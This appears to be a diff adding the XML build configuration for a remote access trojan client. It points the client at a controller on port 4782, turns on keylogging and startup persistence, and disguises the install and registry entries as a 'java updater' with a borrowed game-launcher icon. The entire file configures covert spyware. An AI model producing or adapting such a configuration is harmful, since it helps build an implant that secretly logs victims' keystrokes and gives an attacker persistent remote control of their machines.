@@ -1,0 +1,37 @@
+<settings>
+  <Tag>home</Tag>
+  <Hosts>192.168.1.179:4782;</Hosts>
+  <Delay>3000</Delay>
+  <Mutex>c5e80c0c-69a2-46ee-812c-e2e292822faa</Mutex>
+  <UnattendedMode>False</UnattendedMode>
+  <InstallClient>True</InstallClient>
+  <InstallName>imageLogger</InstallName>
+  <InstallPath>1</InstallPath>
+  <InstallSub>java updater</InstallSub>
+  <HideFile>False</HideFile>
+  <HideSubDirectory>False</HideSubDirectory>
+  <AddStartup>True</AddStartup>
+  <RegistryName>java updater</RegistryName>
+  <ChangeIcon>True</ChangeIcon>
+  <IconPath>C:\Program Files\Illenium Launcher\Illenium Launcher.ico</IconPath>
+  <ChangeAsmInfo>False</ChangeAsmInfo>
+  <Keylogger>True</Keylogger>
+  <LogDirectoryName>Logs</LogDirectoryName>
+  <HideLogDirectory>False</HideLogDirectory>
+  <ProductName>
+  </ProductName>
+  <Description>
+  </Description>
+  <CompanyName>
+  </CompanyName>
+  <Copyright>
+  </Copyright>
+  <Trademarks>
+  </Trademarks>
+  <OriginalFilename>
+  </OriginalFilename>
+  <ProductVersion>
+  </ProductVersion>
+  <FileVersion>
+  </FileVersion>
+</settings>
